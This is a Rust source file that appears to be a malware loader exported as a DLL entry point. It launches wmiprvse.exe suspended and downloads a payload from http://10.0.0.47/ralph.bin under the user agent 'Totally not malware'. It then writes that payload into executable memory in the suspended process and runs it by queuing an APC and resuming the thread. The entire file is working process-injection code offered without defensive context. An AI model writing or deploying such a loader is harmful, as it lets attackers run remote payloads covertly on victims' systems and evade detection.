extern crate ntapi;
extern crate winapi;

use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntpsapi::{NtResumeThread, NtQueueApcThread};
use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READWRITE, MEM_COMMIT};
use winapi::shared::ntdef::NT_SUCCESS;
use std::ffi::CString;
use std::ptr;
use winapi::ctypes::c_void;
use std::error::Error;


unsafe fn create_process() -> Result<(HANDLE, HANDLE), &'static str> {
    let executable_path = CString::new("C:\\Windows\\System32\\wbem\\wmiprvse.exe").unwrap();
    let mut si: STARTUPINFOA = std::mem::zeroed();
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

    let success = winapi::um::processthreadsapi::CreateProcessA(
        executable_path.as_ptr(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        winapi::shared::minwindef::FALSE,
        winapi::um::winbase::CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut si,
        &mut pi,
    );

    if success != 0 {
        Ok((pi.hProcess, pi.hThread))
    } else {
        Err("Failed to create process")
    }
}

async fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let client = reqwest::Client::builder()
        .user_agent("Totally not malware")
        .build()?;

    let mut response = client.get(url).send().await?;

    if response.status().is_success() {
        let mut payload = Vec::new();
        while let Some(chunk) = response.chunk().await? {
            payload.extend_from_slice(&chunk);
        }
        Ok(payload)
    } else {
        Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, "Failed to fetch data")))
    }
}

#[no_mangle]
pub extern "C" fn EntryPoint(_buf: *const u8, _buf_len: usize) -> bool {
    let (process_handle, thread_handle) = match unsafe { create_process() } {
        Ok(handles) => handles,
        Err(_e) => {
            return false;
        },
    };

    let future = get_payload_from_url("http://10.0.0.47/ralph.bin");
    let runtime = tokio::runtime::Runtime::new().unwrap();
    let buf = match runtime.block_on(future) {
        Ok(data) if !data.is_empty() => data,
        _ => {
            return false;
        }
    };

    unsafe {
        let mut base_address: *mut c_void = ptr::null_mut();
        let mut size = buf.len();

        let status = NtAllocateVirtualMemory(
            process_handle,
            &mut base_address as *mut *mut c_void,  
            0,
            &mut (size),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if !NT_SUCCESS(status) {
            return false;
        }

        let status = NtWriteVirtualMemory(
            process_handle,
            base_address,
            buf.as_ptr() as *const _ as *mut _,  
            size,
            ptr::null_mut(),
        );
        if !NT_SUCCESS(status) {
            return false;
        }

        let status = NtQueueApcThread(
            thread_handle,
            Some(std::mem::transmute(base_address)),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        );
        if !NT_SUCCESS(status) {
            return false;
        }

        let status = NtResumeThread(thread_handle, ptr::null_mut());
        if !NT_SUCCESS(status) {
            return false;
        }
    }

    true
}